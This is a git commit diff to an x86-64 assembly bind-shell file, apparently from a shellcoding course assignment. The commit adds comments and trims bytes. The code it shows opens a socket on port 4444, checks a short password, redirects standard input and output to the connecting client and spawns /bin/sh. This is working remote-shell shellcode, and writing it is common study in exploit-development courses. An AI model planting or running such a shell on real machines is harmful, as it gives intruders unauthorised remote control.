a5cadbd70de73afa194bdcadb89af16d250c3d07
Sebastian Feldmann <sebastian.feldmann.hb@web.de>
2018-07-14 01:56:53 -0400

    More comments and saving 3 bytes

--- Assignment1/BindShell_Password.asm
+++ Assignment1/BindShell_Password.asm
@@ -21,7 +21,8 @@ SYS_SOCKET equ 41
 
 _start:
 
-_init_socket: ; First create a local socket
+_init_socket: 
+    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
 
     push SYS_SOCKET
     pop rax
@@ -34,25 +35,28 @@ _init_socket: ; First create a local socket
     mov r10, rax ; save created socket in r10
 
 _init_struct_sockaddr:
-
-    sub rsp, 16 ; Make some space for struct_sockaddr on the stack
+    ; struct sockaddr = {AF_INET; 4444; 0x0; 0x0}
+    
+    sub rsp, 16
     mov byte[rsp], AF_INET
-    mov word[rsp + 0x2], PORT ; port is 4444
+    mov word[rsp + 0x2], PORT 
     push rsp
     pop rsi
 
 _bind_sock:
-    
+    ;bind(sockfd, const struct sockaddr *addr, 16)
+
     push rax
-    pop rdi ; rdi is now newly created socket
+    pop rdi
     push SIZE_STRUCT
-    pop rdx ; rdx now has the size of the struct
+    pop rdx 
     push SYS_BIND
-    pop rax ; rax now has sycall_bind
+    pop rax 
 
     syscall
 
 _listen:
+    ;listen(fd, 0)
 
     push r10
     pop rdi
@@ -63,14 +67,15 @@ _listen:
     syscall
 
 _accept_client:
+    ;accept(fd, struct sockaddr *addr, 16)
 
-    push r10 ; retreive saved socket
+    push r10 
     pop rdi
     push SIZE_STRUCT
     pop rdx
     push SYS_ACCEPT
     pop rax
-    xor rsi, rsi ; struct null means accept everyone
+    xor rsi, rsi 
 
     syscall
 
@@ -78,6 +83,7 @@ _accept_client:
     pop rdi
 
 _read_pw:
+    ;read(client, *buf, 4)
     
     push rsp
     pop rsi
@@ -101,6 +107,7 @@ _good_pw:
     pop rsi
 
 _do_dup2:
+    ; loop to duplicate stdin, stdout and stderr to accepted clientsocket
 
     dec rsi
     mov al, SYS_DUP2
@@ -108,9 +115,9 @@ _do_dup2:
     jne _do_dup2
 
 _spawn_shell:
+    ; execve('//bin/sh', NULL, NULL)
 
     xor rdx, rdx
-    xor rsi, rsi
     mov rdi, '/bin//sh'
     push rdx
     push rdi
